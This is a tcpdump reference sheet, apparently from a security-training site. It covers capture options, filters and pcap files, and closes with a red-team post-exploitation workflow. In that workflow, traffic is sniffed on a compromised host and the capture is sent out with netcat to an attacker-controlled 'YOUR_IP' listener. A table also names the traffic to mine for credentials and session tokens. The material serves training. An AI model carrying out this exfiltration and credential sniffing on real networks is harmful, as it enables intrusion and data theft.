tcpdump

Command-line packet capture

Capture network traffic from the terminal — essential when you only have shell access and can't run Wireshark.

What is tcpdump?

tcpdump is a command-line packet analyzer. It captures network traffic and displays it as text output or saves it to a file for later analysis.

tcpdump vs Wireshark

Use tcpdump when Use Wireshark when
On a remote server via SSH On your local machine with GUI
Quick capture, analyze later Detailed analysis with filters
Scripting or automation Visual inspection of packets
Low resource environment Full-featured investigation
Post-exploitation on compromised box Examining saved .pcap files

Basic Commands

Most commands require sudo or root privileges.

Command What it does
tcpdump Capture all traffic on default interface
tcpdump -i eth0 Capture on specific interface
tcpdump -i any Capture on all interfaces
tcpdump -D List available interfaces
tcpdump -c 100 Capture only 100 packets then stop
tcpdump -n Show IP addresses (don't resolve to hostnames)
tcpdump -nn Show IPs and ports as numbers (no DNS or service name resolution)
tcpdump -v Verbose output (more detail)
tcpdump -vv Even more verbose
tcpdump -q Quiet — less output, just basics

Saving and Reading Captures

Command What it does
tcpdump -w capture.pcap Save packets to file
tcpdump -r capture.pcap Read packets from file
tcpdump -c 500 -w capture.pcap Capture 500 packets and save
Save to .pcap format so you can open it in Wireshark later.

Filters

Filter traffic to capture only what you need.

By Host

Filter What it captures
tcpdump host 10.10.10.5 Traffic to or from that IP
tcpdump src 10.10.10.5 Traffic from that IP
tcpdump dst 10.10.10.5 Traffic to that IP

By Port

Filter What it captures
tcpdump port 80 Traffic on port 80
tcpdump port 443 Traffic on port 443
tcpdump src port 80 Traffic from port 80
tcpdump dst port 22 Traffic to port 22

By Protocol

Filter What it captures
tcpdump tcp Only TCP traffic
tcpdump udp Only UDP traffic
tcpdump icmp Only ICMP (ping) traffic

Combining Filters

Filter What it captures
tcpdump host 10.10.10.5 and port 80 HTTP traffic to/from that host
tcpdump src 10.10.10.5 and tcp TCP traffic from that host
tcpdump port 80 or port 443 HTTP or HTTPS traffic
tcpdump not port 22 Everything except SSH

Red Team Workflow

ðŸŽ¯ Post-Exploitation Packet Capture

You've compromised a Linux machine and want to capture internal network traffic.

Check available interfaces:
tcpdump -D
Start capturing (limit packets so it doesn't run forever):
tcpdump -i eth0 -c 1000 -w /tmp/capture.pcap
Wait for traffic or trigger activity
Transfer the capture to your machine:
On your machine: nc -lvnp 4444 > capture.pcap
On target: nc YOUR_IP 4444 < /tmp/capture.pcap
(or use scp, curl, wget, etc.)
Analyze in Wireshark on your machine

What to Look For

Traffic Why it matters
HTTP Credentials, session tokens, sensitive data
FTP / Telnet Plaintext passwords
DNS queries Internal hostnames and services
SMB File share access, usernames
Any unencrypted traffic Internal networks often don't encrypt

Glossary

Interface
Network adapter (eth0, wlan0, etc.)
pcap
Packet capture file format (.pcap or .pcapng)
Filter
Rule to capture only matching traffic
Verbose
More detailed output (-v, -vv, -vvv)
DNS resolution
Converting IP addresses to hostnames (disabled with -n)
